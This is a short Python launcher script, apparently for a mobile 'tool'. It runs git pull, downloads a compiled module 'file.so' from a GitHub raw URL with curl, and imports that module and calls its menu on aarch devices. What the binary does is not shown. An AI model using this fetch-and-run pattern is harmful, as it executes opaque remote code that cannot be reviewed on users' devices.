import os
os.system('git pull')
from os import path,system
from platform import uname
arch=uname().machine.lower()
if path.isfile("file.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/META-503/META/main/file.so -o file.so")
if 'aarch' in arch:
    print('\033[1;34m\n Congratulations! Your Device Support This Tools\033[1;37m')
    import file
    file.menu()
else:exit('\033[1;31m\n Sorry System or device not supported ')
    
